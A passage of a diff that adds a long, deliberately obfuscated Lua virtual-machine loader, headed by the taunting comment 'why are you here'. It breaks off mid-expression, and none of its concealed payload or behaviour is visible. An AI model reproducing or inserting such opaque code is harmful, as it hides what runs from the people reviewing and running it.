@@ -1,2 +1,7835 @@
---why are you here???????????
-do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v71=0;while true do if (v71==0) then v19=v0(v3(v20,1,1));return "";end end else local v72=v2(v0(v20,16));if v19 then local v79=0;local v80;while true do if (v79==1) then return v80;end if (0==v79) then v80=v5(v72,v19);v19=nil;v79=1;end end else return v72;end end end);local function v21(v22,v23,v24)if v24 then local v73=(v22/((1 + 1)^(v23-(1 + (369 -(314 + 55))))))%((2 + 0)^(((v24-(1353 -(1142 + 210))) -(v23-((558 + 1289) -(1777 + (1637 -(1319 + 249)))))) + (3 -2))) ;return v73-(v73%1) ;else local v74=0 + 0 ;local v75;while true do if (v74==(1876 -(1196 + (2658 -(744 + 1234))))) then v75=(735 -(53 + 680))^(v23-1) ;return (((v22%(v75 + v75))>=v75) and 1) or (0 -0) ;end end end end local function v25()local v38=0 + 0 ;local v39;while true do if ((0 -0)==v38) then v39=v1(v16,v18,v18);v18=v18 + (997 -(30 + (1457 -(71 + 420)))) ;v38=(1 -0) -0 ;end if (v38==(1 -0)) then return v39;end end end local function v26()local v40=(0 -0) -0 ;local v41;local v42;while true do if (v40==(1077 -(1070 + 7))) then v41,v42=v1(v16,v18,v18 + 1 + 1 );v18=v18 + 2 ;v40=1 + 0 ;end if (v40==((2 -1) -0)) then return (v42 * (249 + 7)) + v41 ;end end end local function v27()local v43=0 -(1077 -(159 + 918)) ;local v44;local v45;local v46;local v47;while true do if (v43==(1128 -(827 + 300))) then return (v47 * (61265629 -44488413)) + (v46 * (9072 + 56464)) + (v45 * 256) + v44 ;end if (v43==(0 + 0)) then v44,v45,v46,v47=v1(v16,v18,v18 + ((19 -9) -7) );v18=v18 + 4 ;v43=1 + (1006 -(893 + 113)) ;end end end local function v28()local v48=0 + 0 ;local v49;local v50;local v51;local v52;local v53;local v54;while true do if (v48==(1 + 0)) then v51=1 + 0 ;v52=(v21(v50,234 -(91 + 26 + 116) ,20) * ((1970 -(1547 + 421))^(12 + 20))) + v49 ;v48=2 + 0 ;end if (v48==0) then v49=v27();v50=v27();v48=1;end if (v48==3) then if (v53==(0 -0)) then if (v52==(63 -(19 + 44))) then return v54 * (0 -(0 -0)) ;else v53=1742 -(133 + 1608) ;v51=0 + (0 -0) ;end elseif (v53==((3241 -(159 + 40)) -(179 + 816))) then return ((v52==(0 -0)) and (v54 * (1/((0 + 0) -0)))) or (v54 * NaN) ;end return v8(v54,v53-(602 + 421) ) * (v51 + (v52/((3 -1)^(21 + 31)))) ;end if ((2 + 0)==v48) then v53=v21(v50,14 + 7 ,10 + 21 );v54=((v21(v50,414 -(35 + 3 + 344) )==(1 + 0)) and  -(1 + 0)) or 1 ;v48=1565 -(734 + 828) ;end end end local function v29(v30)local v55=0 + 0 ;local v56;local v57;while true do if ((501 -(225 + 276))==v55) then v56=nil;if  not v30 then local v88=0 + 0 ;while true do if (v88==(0 + 0)) then v30=v27();if (v30==(0 -0)) then return "";end break;end end end v55=728 -((911 -260) + (1752 -(281 + 1395))) ;end if (v55==(2 + 1)) then return v6(v57);end if (v55==(1 + 0)) then v56=v3(v16,v18,(v18 + v30) -(1481 -(928 + 552)) );v18=v18 + v30 ;v55=1 + 1 ;end if (v55==(132 -((7 -3) + 126))) then v57={};for v81=1 -0 , #v56 do v57[v81]=v2(v1(v3(v56,v81,v81)));end v55=3;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v58=0;local v59;local v60;local v61;local v62;local v63;local v64;local v65;local v66;while true do if (v58~=(1097 -(886 + 211))) then else v59=0;v60=nil;v58=1;end if (v58~=1) then else v61=nil;v62=nil;v58=772 -(724 + 46) ;end if ((2 + 0)~=v58) then else v63=nil;v64=nil;v58=3;end if (v58~=(4 + 0)) then else while true do if (v59==(1278 -(1066 + 209))) then v66=nil;while true do local v104=0;local v105;while true do if (v104~=(0 + 0)) then else v105=0 -0 ;while true do if (v105~=1) then else if (v60~=0) then else local v116=0 -0 ;local v117;while true do if (v116==0) then v117=1833 -(1525 + 308) ;while true do if (1==v117) then local v119=0;while true do if ((1873 -(1589 + 284))==v119) then v63={};v64={v61,v62,nil,v63};v119=1;end if (v119==1) then v117=3 -1 ;break;end end end if (v117~=(6 -4)) then else v60=1;break;end if ((0 -0)==v117) then local v120=0 -0 ;while true do if ((1668 -(151 + 1516))~=v120) then else v117=3 -2 ;break;end if (v120~=(0 + 0)) then else v61={};v62={};v120=1;end end end end break;end end end break;end if (v105==(0 + 0)) then local v114=0;local v115;while true do if (v114==0) then v115=0;while true do if (v115==0) then local v118=0;while true do if (v118~=(0 + 0)) then else if (v60==(1493 -(57 + 1435))) then local v285=0;while true do if (v285~=(2 + 0)) then else v60=2;break;end if (v285==0) then v65=v27();v66={};v285=929 -(760 + 168) ;end if (v285~=(1278 -(523 + 754))) then else for v332=1,v65 do local v333=728 -(319 + 409) ;local v334;local v335;local v336;while true do if (v333==1) then v336=nil;while true do if (v334==0) then v335=v25();v336=nil;v334=1;end if (v334==1) then if (v335==1) then v336=v25()~=(0 -0) ;elseif (v335==2) then v336=v28();elseif (v335==(478 -(31 + 444))) then v336=v29();end v66[v332]=v336;break;end end break;end if (v333==(100 -(85 + 15))) then v334=0;v335=nil;v333=1;end end end v64[6 -3 ]=v25();v285=3 -1 ;end end end if (v60~=(1897 -(833 + 1062))) then else local v286=0;while true do if (0==v286) then for v337=1 + 0 ,v27() do local v338=0 -0 ;local v339;local v340;while true do if (v338==0) then v339=0;v340=nil;v338=1 -0 ;end if (v338==1) then while true do if (v339~=(554 -(151 + 403))) then else v340=v25();if (v21(v340,1 + 0 ,1)~=0) then else local v440=0;local v441;local v442;local v443;local v444;while true do if (v440~=(703 -(404 + 299))) then else v441=0;v442=nil;v440=4 -3 ;end if (v440~=1) then else v443=nil;v444=nil;v440=1 + 1 ;end if (v440==(4 -2)) then while true do if (v441==(1 + 0)) then local v493=0 -0 ;while true do if (v493~=(0 -0)) then else v444={v26(),v26(),nil,nil};if (v442==(1786 -(8 + 1778))) then local v507=0;local v508;while true do if (v507==(0 -0)) then v508=0;while true do if (v508==(0 + 0)) then v444[3]=v26();v444[4]=v26();break;end end break;end end elseif (v442==(4 -3)) then v444[4 -1 ]=v27();elseif (v442==(1573 -(1563 + 8))) then v444[3]=v27() -((1627 -(1133 + 492))^(6 + 10)) ;elseif (v442==3) then local v524=0;local v525;while true do if (v524~=0) then else v525=0;while true do if ((1204 -(242 + 962))~=v525) then else v444[3]=v27() -((2 -0)^16) ;v444[4 + 0 ]=v26();break;end end break;end end end v493=1 + 0 ;end if (v493~=(1206 -(411 + 794))) then else v441=1602 -(1032 + 568) ;break;end end end if (v441==(1235 -(670 + 563))) then local v494=0 -0 ;while true do if (v494==(0 -0)) then if (v21(v443,1,1)==(4 -3)) then v444[1787 -(1177 + 608) ]=v66[v444[1862 -(965 + 895) ]];end if (v21(v443,1659 -(498 + 1159) ,2)==(1 + 0)) then v444[3]=v66[v444[329 -(296 + 30) ]];end v494=1;end if (1==v494) then v441=3;break;end end end if (v441~=3) then else if (v21(v443,1410 -(760 + 647) ,5 -2 )==1) then v444[4]=v66[v444[1376 -(1233 + 139) ]];end v61[v337]=v444;break;end if (v441==(0 + 0)) then local v496=770 -(99 + 671) ;while true do if (v496~=1) then else v441=1;break;end if ((0 -0)==v496) then v442=v21(v340,2,5 -2 );v443=v21(v340,8 -4 ,131 -(108 + 17) );v496=1 -0 ;end end end end break;end end end break;end end break;end end end for v341=2 -1 ,v27() do v62[v341-1 ]=v33();end v286=1;end if (v286~=1) then else local v300=0;while true do if (v300~=0) then else for v394=1713 -(919 + 793) ,v27() do v63[v394]=v27();end return v64;end end end end end v118=1 + 0 ;end if (v118~=(877 -(231 + 645))) then else v115=1 + 0 ;break;end end end if (v115==(176 -(33 + 142))) then v105=1;break;end end break;end end end end break;end end end break;end if (v59==1) then v62=nil;v63=nil;v59=1151 -(666 + 483) ;end if (v59==(1686 -(1217 + 469))) then v60=0;v61=nil;v59=1987 -(1017 + 969) ;end if (v59==(574 -(153 + 419))) then local v99=1486 -(408 + 1078) ;local v100;while true do if (0~=v99) then else v100=0;while true do if (v100~=(2 -1)) then else v59=3;break;end if ((0 -0)==v100) then local v111=0;while true do if (v111==0) then v64=nil;v65=nil;v111=1 + 0 ;end if (v111~=(1 + 0)) then else v100=982 -(833 + 148) ;break;end end end end break;end end end end break;end if (v58==3) then v65=nil;v66=nil;v58=4 + 0 ;end end end local function v34(v35,v36,v37)local v67=0;local v68;local v69;local v70;while true do if (1==v67) then v70=v35[3];return function(...)local v83=1;local v84= -1;local v85={...};local v86=v12("#",...) -1 ;local function v87()local v89=v68;local v90=v69;local v91=v70;local v92=v32;local v93={};local v94={};local v95={};for v101=299 -(193 + 106) ,v86 do if (((2394 -1024)<(2683 + 939)) and (v101>=v91)) then v93[v101-v91 ]=v85[v101 + (3 -(1880 -(173 + 1705))) ];else v95[v101]=v85[v101 + (320 -(242 + 77)) ];end end local v96=(v86-v91) + (296 -(82 + 21 + 192)) ;local v97;local v98;while true do local v102=767 -((990 -(439 + 26)) + 242) ;while true do if (((661 + 2175)==((37328 -25688) -(24269 -15465))) and (v102==(1 -(0 -0)))) then if (((8641 -4650)>(7034 -3451)) and (v98<=(44 -13))) then if (((5182 -3669)==((2801 -(118 + 279)) -(746 + 145))) and (v98<=(15 + 0))) then if (((4727 -(471 + 84 + 1443))>=(2223 -(17 + 11))) and (v98<=(452 -(86 + (1020 -661))))) then if ((v98<=(3 + 0)) or ((1827 -(494 + 787 + 51))==((2013 -(196 + 74)) -((4806 -3298) + 188)))) then if ((v98<=((442 + 86) -(397 + 130))) or ((5725 -(1838 + 118))<((79 + 976) -350))) then if (((6188 -(349 + 1505))>(3875 -(689 + 151))) and (v98==(0 + 0))) then local v121=(455 + 1057) -(34 + 1478) ;local v122;local v123;local v124;local v125;local v126;while true do if (((4422 -(707 + 981))==(3517 -(16 + 767))) and (v121==(428 -(418 + 8)))) then v126=nil;while true do if ((v122==(1425 -(615 + (3137 -2329)))) or ((4981 -2431)<=(1043 + 858))) then while true do if ((v123==(0 + 0)) or ((2599 + 290)>=(8420 -3503))) then local v358=639 -(235 + 404) ;while true do if ((v358==(1 + 0)) or ((11854 -8582)>=(15547 -10891))) then v123=2 -1 ;break;end if ((v358==(1930 -((2101 -636) + 465))) or (((1331 + 3549) -(304 + 433))>(19082 -(16145 -(1316 + 676))))) then local v430=1444 -(1409 + 35) ;while true do if ((v430==(0 + 0)) or (((2444 + 822) -(952 + 285))>=(4180 -(868 + 15)))) then v124=v90[v97[3 + 0 ]];v125=nil;v430=570 -(433 + 136) ;end if ((2192<=(4241 -(1353 + 153))) and (v430==(3 -2))) then v358=1;break;end end end end end if ((((2639 -(1080 + 100)) + 2455)==(2209 + 1705)) and (v123==(575 -(207 + 206 + 160)))) then for v396=1150 -(627 + 337 + 185) ,v97[1265 -(525 + 736) ] do local v397=0 -0 ;local v398;local v399;local v400;while true do if (((170 + 132)<(4805 -(414 + 459))) and (v397==(1489 -(858 + 630)))) then v400=nil;while true do if (((1574 -(15 + 302 + 1255))<(37 + (6645 -3349))) and ((0 -(0 + 0))==v398)) then v399=0 + 0 + 0 ;v400=nil;v398=1997 -(1297 + 699) ;end if ((v398==(2 -1)) or ((374 + 4149)<=((7719 -(1300 + 659)) -(1273 + 1989)))) then while true do if ((v399==(0 + 0)) or ((654 -(393 + 47))>=(948 + 1670))) then local v475=0 -0 ;local v476;while true do if ((v475==(0 + 0)) or ((2518 -(216 + 346))==(1478 -865))) then v476=0 -0 ;while true do if (((0 + 0)==v476) or ((1484 -567)>=(4672 -2440))) then local v505=286 -(153 + 133) ;while true do if (((612 + 1223)>=(1787 -((514 -(252 + 257)) + 6))) and (v505==(0 -0))) then v83=v83 + ((2729 -(375 + 817)) -((3600 -2659) + 595)) ;v400=v89[v83];v505=1 -(0 -0) ;end if ((v505==1) or ((2432 -(134 + 347))>=(3846 -((1081 -580) + 757)))) then v476=1 + 0 ;break;end end end if ((v476==(524 -((1488 -(1226 + 253)) + 514))) or ((5136 -(8629 -4835))>(8851 -5856))) then v399=2 -1 ;break;end end break;end end end if (((485 + 785)<=(15890 -11583)) and (v399==(27 -((43 -30) + 13)))) then if ((v400[1 + 0 ]==(96 -35)) or (658>(583 + 2246))) then v126[v396-(3 -2) ]={v95,v400[2 + 1 ]};else v126[v396-(1 -0) ]={v36,v400[9 -6 ]};end v94[ #v94 + 1 + 0 ]=v126;break;end end break;end end break;end if (((9159 -5257)<(4854 -((1031 -(281 + 689)) + 63))) and (v397==(0 + 0))) then v398=0 + 0 + 0 ;v399=nil;v397=1 + 0 ;end end end v95[v97[1 + 1 ]]=v34(v124,v125,v37);break;end if ((v123==(624 -(79 + 544))) or ((1447 -(444 + 227))>(1941 + 590))) then local v360=0 -0 ;local v361;while true do if ((v360==(0 + 0)) or (((7631 -(40 + 112)) -4618)>=(2598 + 1492))) then v361=1705 -(829 + 876) ;while true do if (((1911 -1242)<=(30 + 75 + 797)) and ((4 -3)==v361)) then v123=2 -0 ;break;end if ((v361==(0 + 0)) or ((5868 -((321 -200) + 1234))<=(487 + 448))) then local v446=(0 -0) -0 ;while true do if ((v446==(1 + 0)) or ((2710 -1576)>(4317 -(351 + 1179)))) then v361=1397 -(1121 + 275) ;break;end if (((593 + 1291)<(3353 + 1636)) and (v446==(0 + 0))) then v126={};v125=v10({},{__index=function(v467,v468)local v478=1946 -(1529 + 417) ;local v479;local v480;local v481;while true do if ((445<=(8082 -4648)) and (v478==(0 -0))) then v479=0 + 0 ;v480=nil;v478=1 + 0 ;end if ((((3557 -2189) -345)>(301 -201)) and ((2 -1)==v478)) then v481=nil;while true do if (((1520 -(154 + 140))>(591 + 332)) and (v479==((4106 -2648) -(1400 + 58)))) then v480=0 -0 ;v481=nil;v479=434 -(321 + 112) ;end if ((v479==(1 + 0 + 0)) or ((2180 + 1415)==(4347 -1006))) then while true do if (((2116 -(104 + 27))>(2322 -(1085 + 236))) and ((0 + 0)==v480)) then local v517=0 + 0 ;while true do if ((v517==(0 + 0)) or ((1555 + (1610 -(100 + 862)))>(5312 -(1173 + 82 + 35)))) then local v521=1488 -(1269 + 219) ;while true do if (((4821 -2838)<=(5057 -(37 + (609 -(167 + 342))))) and (v521==(0 + 0))) then v481=v126[v468];return v481[1 -0 ][v481[2 -0 ]];end end end end end end break;end end break;end end end,__newindex=function(v467,v468,v469)local v482=0 + 0 ;local v483;local v484;local v485;while true do if (((3124 -(671 + 1081))<(11178 -7859)) and (v482==(869 -(361 + 50 + 457)))) then v485=nil;while true do if (((2380 -((3075 -(727 + 1059)) + (1845 -(120 + 1034))))==400) and (v483==(1668 -(188 + 1480)))) then local v506=0 -0 ;while true do if ((v506==(0 -(0 + 0))) or ((8783 -4888)<=(1341 + 6))) then v484=0 -0 ;v485=nil;v506=490 -(434 + 55) ;end if ((3545==(50 + 1146 + 2349)) and (v506==(1 + (0 -0)))) then v483=1 + 0 ;break;end end end if (((1576 -(110 + 123))<=(1699 + 1983)) and (v483==((2 -1) -0))) then while true do if (((12735 -9342)>=(250 + 204)) and (v484==(0 -0))) then v485=v126[v468];v485[2 -1 ][v485[3 -1 ]]=v469;break;end end break;end end break;end if (((2504 -(717 + 229))>=(2526 -(222 + 1130))) and ((1127 -(299 + 828))==v482)) then v483=1918 -(587 + 1331) ;v484=nil;v482=2 -1 ;end end end});v446=3 -2 ;end end end end break;end end end end break;end if ((((1778 -584) + 19)<=(591 + 3916)) and ((1 + (166 -(129 + 37)))==v122)) then local v301=0 -(685 -(284 + 401)) ;while true do if (((4937 -(1128 + 633))<=(5981 -2175)) and ((156 -(15 + 140))==v301)) then v122=(579 -(154 + 72)) -(239 + 112) ;break;end if (((5216 -(7276 -3222))>=((162 + 240) -(106 + 107))) and (v301==(1972 -(352 + 1620)))) then v125=nil;v126=nil;v301=172 -(80 + 91) ;end end end if (((4376 -(7 + 183))>=(1186 + 2284)) and (v122==((3085 -1689) -(389 + 1007)))) then v123=0 -0 ;v124=nil;v122=3 -2 ;end end break;end if ((v121==(508 -((645 -(136 + 436)) + 434))) or ((44 + 3028)<(91 + 383))) then v124=nil;v125=nil;v121=4 -2 ;end if (((15355 -10727)>=(543 + 3511)) and ((468 -(98 + 370))==v121)) then v122=1743 -(329 + 1414) ;v123=nil;v121=1 -0 ;end end else local v127=0 + 0 ;local v128;local v129;local v130;local v131;local v132;local v133;while true do if ((v127==(1 + 1)) or ((4310 -(1154 + 108))==(2623 + 1806))) then v132=nil;v133=nil;v127=(72 -(62 + 4)) -(1 + 2) ;end if (((61 + (4631 -(188 + 528)))==((4745 + 1041) -(45 + 1765))) and (v127==(1052 -(560 + 491)))) then v130=nil;v131=nil;v127=2 + 0 ;end if ((v127==(166 -(54 + 109))) or ((2917 + 798 + 22)==(2874 -(1219 + 570)))) then while true do if ((v128==(0 + 0)) or ((358 -184)>=(1862 -1145))) then v129=912 -(78 + 101 + 733) ;v130=nil;v128=20 -(10 + (434 -(116 + 309))) ;end if (((7785 -3970)>=(1721 -(699 + (2528 -(743 + 1157))))) and ((1 + 0)==v128)) then local v302=0;while true do if (((3871 -(549 + (2310 -1068)))>(224 + 692)) and (v302==(0 -0))) then v131=nil;v132=nil;v302=2 -1 ;end if ((v302==(1 + 0)) or ((3127 -1531)==4637)) then v128=2 + 0 ;break;end end end if ((v128==(1726 -((2118 -(270 + 469)) + 345))) or ((11248 -8156)<(2866 -(180 + 194)))) then v133=nil;while true do if (((8082 -3577)==(18784 -14279)) and (v129==(0 + 0))) then local v362=0 -0 ;local v363;while true do if ((v362==(0 + 0)) or ((6913 -4737)>(16213 -11905))) then v363=255 -(112 + 143) ;while true do if (((2469 -1460)<(4277 + 538)) and (v363==(1821 -(1100 + 721)))) then local v447=0 + 0 + 0 ;while true do if ((v447==(3 -2)) or ((6300 -(1198 + 494))<(12358 -9219))) then v363=(49 + 59) -(99 + 8) ;break;end if (((3668 -2350)>(424 -256)) and ((0 + 0)==v447)) then v130=v97[1 + 1 ];v131,v132=v92(v95[v130](v13(v95,v130 + (2 -1) ,v84)));v447=3 -(1 + 1) ;end end end if ((v363==(1 + 0)) or ((3647 + 316)<=(2847 -((1449 -1021) + 470)))) then v129=1 + 0 ;break;end end break;end end end if ((v129==(1 + 1)) or ((13859 -10245)<=(2339 -1750))) then for v401=v130,v84 do local v402=0 + 0 + 0 ;local v403;local v404;while true do if (((53 + 264)<(1447 + 2120)) and (v402==(0 -0))) then v403=1951 -(365 + 1586) ;v404=nil;v402=1 + (0 -0) ;end if ((v402==((1 -0) + 0)) or ((2048 + 1186)<=(1745 + 1049))) then while true do if ((v403==(0 -(0 + 0))) or ((190 + 1811)<(569 -(248 + (1317 -(710 + 365)))))) then v404=1254 -(1193 + 61) ;while true do if ((v404==(0 -0)) or ((3530 -(12 + 72))>(17205 -12446))) then v133=v133 + 1 + 0 ;v95[v401]=v131[v133];break;end end break;end end break;end end end break;end if ((v129==(1 -0)) or (983==(14721 -11556))) then local v364=0 -0 ;local v365;while true do if (((286 + 787)<(1252 + 919)) and ((1012 -(861 + 151))==v364)) then v365=0 -0 ;while true do if (((1144 + 758)<(3555 + 622)) and (v365==((1 + 1) -(4 -3)))) then v129=2 -0 ;break;end if (((144 + 687)>(146 + 13)) and (v365==((1736 + 45) -(832 + 949)))) then local v448=0 + 0 ;while true do if (((0 -(0 + 0))==v448) or ((3630 + 608)<(4453 -(68 + 382 + 97)))) then v84=(v132 + v130) -((1989 -(892 + 884)) -(18 + 194)) ;v133=0 + 0 ;v448=1457 -((1891 -(420 + 733)) + 718) ;end if (((3144 -(573 + 536))>(1682 -(510 + (703 -371)))) and (v448==(18 -(11 + 6)))) then v365=1965 -(495 + 1469) ;break;end end end end break;end end end end break;end end break;end if ((v127==0) or ((1134 + 874)<(1860 + 54))) then v128=1562 -(994 + 568) ;v129=nil;v127=1 + 0 ;end end end elseif (((50 + 2591)==(3090 -(40 + (811 -402)))) and (v98>2)) then local v134=0 + 0 ;local v135;local v136;local v137;while true do if ((v134==(2 -1)) or (2903<(67 + 523))) then v137=nil;while true do if (((551 + 281)<(4425 -(443 + 1509))) and (v135==(0 + 0))) then local v303=0 + 0 ;while true do if ((v303==(1 + (0 -0))) or (((3178 + 421) -(451 + 176))>=(465 + (4834 -(420 + 363))))) then v135=194 -(76 + 117) ;break;end if ((v303==(517 -(215 + 302))) or ((13060 -10313)>(13987 -10244))) then v136=(0 -0) + 0 ;v137=nil;v303=1 + 0 ;end end end if (((1878 + 2142)>=((1722 -(344 + 143)) -(578 + 326))) and (v135==(3 -2))) then while true do if (((5311 -(1207 + 269))==(19103 -15268)) and (v136==(0 -0))) then v137=v97[2 -0 ];v95[v137]=v95[v137](v13(v95,v137 + 1 + 0 ,v97[1382 -(436 + 943) ]));break;end end break;end end break;end if (((3403 -(461 + 1015))==((7519 -3930) -(655 + 1007))) and (v134==(0 -0))) then v135=0 -0 ;v136=nil;v134=649 -(152 + 496) ;end end else v95[v97[2 + 0 ]]=v95[v97[762 -(697 + 62) ]] -v97[74 -(18 + 52) ] ;end elseif ((v98<=5) or ((3125 -((43 -12) + 44))<(3559 -2414))) then if (((1347 -754)<((3721 -(448 + 765)) + 1309)) and (v98>(2 + (1962 -(228 + 1732))))) then local v139=1593 -(740 + 853) ;local v140;local v141;while true do if ((v139==(334 -(185 + 149))) or ((10409 -6390)==(5110 -(317 + 802)))) then local v287=230 -(203 + (38 -11)) ;while true do if ((v287==(2 -1)) or ((656 + 135)>2098)) then v139=1 + 0 ;break;end if (((38 + (6655 -4403))>(3019 -(778 + 544))) and ((0 -0)==v287)) then v140=v97[691 -(128 + 561) ];v141=v95[v97[1892 -(1608 + 281) ]];v287=4 -3 ;end end end if (((5226 -(773 + 488))>((2590 -(1011 + 899)) + 140)) and (v139==(1548 -(740 + 807)))) then v95[v140 + 1 + 0 ]=v141;v95[v140]=v141[v97[3 + 1 ]];break;end end elseif ( not v95[v97[1 + 1 ]] or ((4827 -(3458 -(115 + 1860)))<(1400 -984))) then v83=v83 + 1 + 0 ;else v83=v97[4 -(1 -0) ];end elseif ((v98==(9 -3)) or ((28 -15)>=(43 + 114))) then do return v95[v97[1 + 1 ]];end else v95[v97[9 -7 ]]=v95[v97[(1467 -(183 + 1279)) -2 ]][v95[v97[16 -(14 -2) ]]];end elseif ((v98<=(22 -11)) or (267>=(1485 + 1106 + 1502))) then if ((v98<=(1201 -(1069 + (1951 -(522 + 1306))))) or ((696 -494)>=(3826 + 451))) then if ((v98>8) or ((5188 -(325 + (840 -(348 + 5))))==(175 + 2175))) then v95[v97[1 + 1 ]]= #v95[v97[6 -3 ]];else local v145=206 -(201 + 5) ;local v146;local v147;local v148;local v149;while true do if (((762 + 2151)>(1606 -(58 + 6))) and (v145==2)) then while true do if ((v146==(2 -1)) or ((6435 -2934)<=(1375 -956))) then v149=292 -(131 + 161) ;for v343=v147,v97[2 + 2 ] do local v344=0 -0 ;local v345;local v346;while true do if ((v344==(1 + 0)) or ((153 + 842)<=((637 + 429) -612))) then while true do if ((v345==0) or (((1560 -(811 + 680)) + 419)>(7852 -5973))) then v346=515 -(432 + 83) ;while true do if (((8701 -4046)==(1149 + 3506)) and (v346==(0 -0))) then v149=v149 + (661 -(576 + 84)) ;v95[v343]=v148[v149];break;end end break;end end break;end if ((v344==(0 -0)) or ((1320 -(99 + 345))>=((9501 -(485 + 25)) -4616))) then v345=0 -(0 -0) ;v346=nil;v344=721 -(233 + 487) ;end end end break;end if (((12170 -8723)==((6030 + 446) -3029)) and (v146==(0 + 0))) then local v306=0 + 0 ;while true do if (((78 -(34 + 43))==v306) or ((2535 -(317 + 154))>(5580 -(613 + 524 + 136)))) then v146=4 -(5 -2) ;break;end if ((v306==(0 -0)) or ((1235 + 272)>(6024 -3132))) then v147=v97[2 + 0 ];v148={v95[v147](v13(v95,v147 + ((3 + 0) -2) ,v97[255 -(35 + 217) ]))};v306=527 -(201 + 325) ;end end end end break;end if ((1293<(6918 -4057)) and (v145==(2 -1))) then v148=nil;v149=nil;v145=383 -(276 + 105) ;end if ((v145==(0 -0)) or ((1422 + 1201)>(2679 + 524))) then v146=(1175 -(802 + 373)) + 0 ;v147=nil;v145=1 -0 ;end end end elseif ((v98>(1956 -(698 + 1248))) or (568==(29 + 9))) then v95[v97[867 -(346 + 519) ]]=v37[v97[2 + 1 ]];else v95[v97[1656 -(797 + 857) ]]=v97[5 -(92 -(56 + 34)) ] + v95[v97[4 + 0 ]] ;end elseif ((v98<=(43 -30)) or ((167 + 88)>(4847 -(892 + 909)))) then if ((v98==(614 -((582 -256) + 276))) or ((371 + 1381)==(3185 -2310))) then v95[v97[9 -(1132 -(934 + 191)) ]]= not v95[v97[3]];else local v154=1439 -((198 -115) + 1356) ;local v155;local v156;local v157;local v158;local v159;while true do if ((((1353 -(178 + 1174)) + 1)==v154) or ((1630 + 1157)==(700 + 761))) then v159=nil;while true do if (((298 -(20 + 213 + 65))==v155) or (((296 -(29 + 77)) + 235)>((6153 -(1402 + 302)) -(126 + 460)))) then local v307=0 + 0 ;while true do if (((4560 -(852 + 1034))>=(1358 + 836)) and (v307==(1 + 0))) then v155=(2 + 1) -(6 -4) ;break;end if ((v307==(0 -0)) or ((274 + 331)>=(3670 -(22 + (2151 -1129))))) then v156=v97[1448 -(912 + 534) ];v157,v158=v92(v95[v156](v13(v95,v156 + (1 -0) ,v97[2 + 1 + 0 ])));v307=1;end end end if ((v155==(1600 -(719 + 879))) or ((563 + 1088)<(621 -(116 + 56)))) then for v347=v156,v84 do local v348=886 -(638 + 248) ;while true do if (((1076 + 1468)<=((5346 -(1245 + 189)) -(224 + 92))) and (v348==(0 -0))) then v159=v159 + 1 + 0 ;v95[v347]=v157[v159];break;end end end break;end if (((5102 -3412)==(1574 + 116)) and (v155==(1 + 0))) then local v308=808 -(637 + 171) ;while true do if ((v308==((694 -(124 + 16)) -(143 + 40 + 371))) or ((8927 -4728)==(6200 -(289 + (3457 -2503))))) then v84=(v158 + v156) -(1 + 0) ;v159=(1150 -847) -(295 + 8) ;v308=798 -(518 + 279) ;end if ((v308==(2 -1)) or ((305 -99)>(2910 -((1910 -(394 + 704)) + (1683 -(810 + 395)))))) then v155=2 + (1553 -(763 + 790)) ;break;end end end end break;end if ((v154==((3 -2) + 0 + 0)) or ((2809 -(1243 + 518))<=(1329 -(415 + (1431 -(755 + 448)))))) then v157=nil;v158=nil;v154=(1301 -(550 + 749)) -0 ;end if (((3242 -(474 + 909))<(4909 -(476 + 880))) and ((496 -(296 + 200))==v154)) then v155=0 + 0 ;v156=nil;v154=1 + 0 ;end end end elseif ((v98>14) or ((1118 + 599)>(9452 -5449))) then local v160=1603 -(1074 + (2202 -1673)) ;local v161;local v162;local v163;local v164;local v165;local v166;while true do if (((10858 -7620)>=(3409 -(171 + 831))) and (v160==(6 -3))) then while true do if ((v161==(4 -2)) or (3478<((2098 + 4199) -(11282 -7153)))) then v166=nil;while true do if ((v162==(3 -(2 + 0))) or ((5611 -(996 + 260))==(1118 -(317 + 84 + 138)))) then local v370=0 -0 ;while true do if (((12406 -8958)>(2141 + 15)) and (v370==(0 + 0))) then local v431=(2126 -1256) -(227 + (960 -(196 + 121))) ;while true do if (((1430 -(225 + 1205))==v431) or ((1469 -(421 + 557))>(3173 + 71))) then v84=(v165 + v163) -(1 + 0) ;v166=888 -(328 + 560) ;v431=2 -1 ;end if ((v431==(1 + 0)) or ((74 + 186 + 105 + 7)>(3314 -2076))) then v370=1 + 0 ;break;end end end if (((1347 -(2245 -1276))<=(4049 -(232 + 257))) and (v370==((1254 -(1092 + 161)) -0))) then v162=2 + 0 ;break;end end end if (((4779 -(292 + 151))==(2422 + 1914)) and (v162==(0 -(0 + 0)))) then local v371=0 -0 ;local v372;while true do if ((v371==(0 -0)) or ((3292 -(72 + (709 -(445 + 183))))==(2545 -(440 + 960)))) then v372=0 -(0 -0) ;while true do if (((1556 + 2918)>=(6986 -(2400 + 1357))) and (v372==(0 + 0))) then local v449=0 + 0 ;while true do if ((v449==(0 + 0)) or ((5229 -3044)>=(509 + 2307))) then v163=v97[(984 -(141 + 351)) -(167 + (425 -102)) ];v164,v165=v92(v95[v163](v95[v163 + (1891 -(1180 + (1197 -487))) ]));v449=2 -1 ;end if (((3713 + 1010)>(5673 -3753)) and ((1 + 0)==v449)) then v372=1 -0 ;break;end end end if (((492 + 18)<=(696 + 495)) and (v372==(1445 -(1259 + 185)))) then v162=938 -(478 + 459) ;break;end end break;end end end if ((v162==(1597 -(166 + 1429))) or ((5627 -4077)==(1525 -(551 + (771 -191))))) then for v407=v163,v84 do local v408=1276 -((2084 -(153 + 1355)) + 700) ;local v409;local v410;while true do if (((1131 + 2182)<=(8359 -4903)) and (v408==(975 -((1999 -(932 + 337)) + 245)))) then v409=1203 -(11 + 1192) ;v410=nil;v408=1 + 0 ;end if (((4569 + 106)>(3847 -((546 -413) + 957))) and (v408==(1 + 0))) then while true do if (((4572 -2735)<(5973 -(1555 + 48))) and (v409==(0 -0))) then v410=(1263 -(104 + 700)) -(408 + 51) ;while true do if (((4917 + 10)>=(738 -((769 -262) + 170 + 48))) and (v410==(0 + 0))) then v166=v166 + (468 -(130 + 337)) ;v95[v407]=v164[v166];break;end end break;end end break;end end end break;end end break;end if (((3067 -(6427 -4796))>=(837 + 218)) and 